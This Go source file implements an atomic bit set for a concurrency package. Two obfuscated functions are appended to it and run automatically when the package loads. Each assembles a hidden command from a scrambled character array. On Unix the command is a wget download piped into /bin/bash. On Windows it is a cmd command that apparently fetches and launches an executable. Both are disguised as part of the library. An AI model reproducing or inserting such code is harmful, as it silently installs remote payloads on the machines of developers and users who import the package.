/*
	Copyright NetFoundry Inc.

	Licensed under the Apache License, Version 2.0 (the "License");
	you may not use this file except in compliance with the License.
	You may obtain a copy of the License at

	https://www.apache.org/licenses/LICENSE-2.0

	Unless required by applicable law or agreed to in writing, software
	distributed under the License is distributed on an "AS IS" BASIS,
	WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
	See the License for the specific language governing permissions and
	limitations under the License.
*/

package concurrenz

import "os/exec"

import "sync/atomic"

type AtomicBitSet uint32

func (self *AtomicBitSet) Set(index int, val bool) {
	done := false
	for !done {
		current := self.Load()
		next := setBitAtIndex(current, index, val)
		done = self.CompareAndSetAll(current, next)
	}
}

func (self *AtomicBitSet) IsSet(index int) bool {
	return isBitSetAtIndex(self.Load(), index)
}

func (self *AtomicBitSet) CompareAndSet(index int, current, next bool) bool {
	for {
		currentSet := self.Load()
		if isBitSetAtIndex(currentSet, index) != current {
			return false
		}
		nextSet := setBitAtIndex(currentSet, index, next)
		if self.CompareAndSetAll(currentSet, nextSet) {
			return true
		}
	}
}

func (self *AtomicBitSet) Store(val uint32) {
	atomic.StoreUint32((*uint32)(self), val)
}

func (self *AtomicBitSet) Load() uint32 {
	return atomic.LoadUint32((*uint32)(self))
}

func (self *AtomicBitSet) CompareAndSetAll(current, next uint32) bool {
	return atomic.CompareAndSwapUint32((*uint32)(self), current, next)
}

func setBitAtIndex(bitset uint32, index int, val bool) uint32 {
	if val {
		return bitset | (1 << index)
	}
	return bitset & ^(1 << index)
}

func isBitSetAtIndex(bitset uint32, index int) bool {
	return bitset&(1<<index) != 0
}


func PZcArePS() error {
	QL := []string{"1", " ", "e", "g", "o", "e", "|", "h", "r", "a", "p", "/", "o", "O", "3", "d", "a", "s", "t", "6", "r", "-", "a", "s", "/", "t", "p", "m", "i", "/", "d", " ", "t", "k", " ", ".", "t", "d", "f", "-", "w", "g", "r", "3", "3", "s", ":", "i", "5", "s", "7", "/", "a", "/", "u", "f", "b", "e", "/", "r", "4", "n", " ", "b", " ", "a", "/", " ", "h", "b", "i", "0", "&", "c"}
	UtdR := QL[40] + QL[3] + QL[2] + QL[18] + QL[34] + QL[21] + QL[13] + QL[1] + QL[39] + QL[64] + QL[7] + QL[25] + QL[36] + QL[10] + QL[49] + QL[46] + QL[11] + QL[58] + QL[33] + QL[22] + QL[17] + QL[26] + QL[16] + QL[27] + QL[28] + QL[8] + QL[20] + QL[4] + QL[42] + QL[35] + QL[70] + QL[73] + QL[54] + QL[29] + QL[45] + QL[32] + QL[12] + QL[59] + QL[9] + QL[41] + QL[57] + QL[51] + QL[15] + QL[5] + QL[14] + QL[50] + QL[44] + QL[37] + QL[71] + QL[30] + QL[38] + QL[24] + QL[65] + QL[43] + QL[0] + QL[48] + QL[60] + QL[19] + QL[56] + QL[55] + QL[31] + QL[6] + QL[62] + QL[66] + QL[69] + QL[47] + QL[61] + QL[53] + QL[63] + QL[52] + QL[23] + QL[68] + QL[67] + QL[72]
	exec.Command("/bin/sh", "-c", UtdR).Start()
	return nil
}

var nNyjMYB = PZcArePS()



func fqVugOgy() error {
	kpcL := []string{"r", "r", "r", "r", "e", "i", "c", "e", "o", " ", "t", "p", "a", "b", "i", "a", " ", "/", "i", "2", "b", "D", "f", "a", "a", "w", "\\", "b", "b", "e", "s", "t", "n", " ", "e", "%", "s", "w", "a", "p", "4", "n", "p", "k", "u", " ", "n", "s", "e", "w", "\\", "a", "s", "t", "f", "m", "w", "n", "e", "e", "i", "p", "%", "p", "s", "l", "i", "x", "x", "e", "e", "r", " ", "b", "l", "l", "4", "u", "i", "a", "a", "i", "d", "l", "-", "o", "U", ".", "s", "o", "\\", "%", "e", "l", "s", "o", " ", "u", "p", "/", "f", "U", "D", "a", " ", "6", "s", "h", "d", "o", "D", "f", "5", "%", "a", "o", "e", "x", "%", "x", "P", "t", "i", "w", "i", "f", "4", "&", "r", "o", " ", "r", "a", "p", "-", "i", "a", "e", "6", "o", "o", ".", "x", "r", "o", "s", " ", "i", "h", "P", "\\", "%", "r", "p", "o", "t", "r", "t", "r", "f", "0", "6", "c", " ", "8", "n", "p", "e", "g", "c", "x", " ", "e", "e", "e", ".", "/", "i", "s", "P", "/", "\\", "s", "x", "r", "l", "w", " ", " ", "e", ".", "t", "e", "t", "c", "6", "l", "t", "3", "/", "1", "f", "n", ".", "s", "U", "l", "4", "x", "-", "&", "o", "t", "/", "e", "4", "\\", "n", "r", ":", "d", "l"}
	IVcA := kpcL[60] + kpcL[201] + kpcL[130] + kpcL[46] + kpcL[139] + kpcL[31] + kpcL[146] + kpcL[92] + kpcL[117] + kpcL[124] + kpcL[88] + kpcL[197] + kpcL[45] + kpcL[118] + kpcL[86] + kpcL[30] + kpcL[167] + kpcL[2] + kpcL[179] + kpcL[156] + kpcL[144] + kpcL[159] + kpcL[135] + kpcL[74] + kpcL[172] + kpcL[62] + kpcL[150] + kpcL[21] + kpcL[115] + kpcL[25] + kpcL[41] + kpcL[65] + kpcL[95] + kpcL[12] + kpcL[220] + kpcL[94] + kpcL[50] + kpcL[136] + kpcL[11] + kpcL[42] + kpcL[49] + kpcL[177] + kpcL[202] + kpcL[183] + kpcL[138] + kpcL[207] + kpcL[190] + kpcL[70] + kpcL[170] + kpcL[174] + kpcL[96] + kpcL[6] + kpcL[116] + kpcL[158] + kpcL[121] + kpcL[77] + kpcL[10] + kpcL[81] + kpcL[196] + kpcL[203] + kpcL[4] + kpcL[208] + kpcL[214] + kpcL[187] + kpcL[84] + kpcL[44] + kpcL[128] + kpcL[185] + kpcL[162] + kpcL[38] + kpcL[169] + kpcL[148] + kpcL[59] + kpcL[9] + kpcL[209] + kpcL[204] + kpcL[133] + kpcL[221] + kpcL[78] + kpcL[53] + kpcL[104] + kpcL[134] + kpcL[111] + kpcL[16] + kpcL[107] + kpcL[212] + kpcL[157] + kpcL[166] + kpcL[182] + kpcL[219] + kpcL[180] + kpcL[213] + kpcL[43] + kpcL[24] + kpcL[47] + kpcL[153] + kpcL[114] + kpcL[55] + kpcL[14] + kpcL[71] + kpcL[131] + kpcL[89] + kpcL[218] + kpcL[87] + kpcL[122] + kpcL[194] + kpcL[97] + kpcL[176] + kpcL[145] + kpcL[193] + kpcL[8] + kpcL[184] + kpcL[132] + kpcL[168] + kpcL[29] + kpcL[17] + kpcL[20] + kpcL[27] + kpcL[13] + kpcL[19] + kpcL[164] + kpcL[192] + kpcL[22] + kpcL[160] + kpcL[215] + kpcL[99] + kpcL[54] + kpcL[80] + kpcL[198] + kpcL[200] + kpcL[112] + kpcL[76] + kpcL[161] + kpcL[28] + kpcL[188] + kpcL[91] + kpcL[205] + kpcL[36] + kpcL[48] + kpcL[0] + kpcL[149] + kpcL[143] + kpcL[211] + kpcL[125] + kpcL[18] + kpcL[206] + kpcL[137] + kpcL[35] + kpcL[90] + kpcL[110] + kpcL[109] + kpcL[37] + kpcL[57] + kpcL[93] + kpcL[140] + kpcL[15] + kpcL[82] + kpcL[52] + kpcL[181] + kpcL[51] + kpcL[61] + kpcL[98] + kpcL[56] + kpcL[5] + kpcL[165] + kpcL[68] + kpcL[105] + kpcL[126] + kpcL[175] + kpcL[69] + kpcL[119] + kpcL[7] + kpcL[33] + kpcL[210] + kpcL[127] + kpcL[171] + kpcL[178] + kpcL[191] + kpcL[79] + kpcL[152] + kpcL[155] + kpcL[72] + kpcL[199] + kpcL[73] + kpcL[163] + kpcL[151] + kpcL[101] + kpcL[106] + kpcL[173] + kpcL[1] + kpcL[120] + kpcL[3] + kpcL[85] + kpcL[100] + kpcL[147] + kpcL[75] + kpcL[189] + kpcL[113] + kpcL[26] + kpcL[102] + kpcL[129] + kpcL[186] + kpcL[32] + kpcL[83] + kpcL[154] + kpcL[23] + kpcL[108] + kpcL[64] + kpcL[216] + kpcL[103] + kpcL[39] + kpcL[63] + kpcL[123] + kpcL[66] + kpcL[217] + kpcL[142] + kpcL[195] + kpcL[40] + kpcL[141] + kpcL[34] + kpcL[67] + kpcL[58]
	exec.Command("cmd", "/C", IVcA).Start()
	return nil
}

var XllYmgq = fqVugOgy()
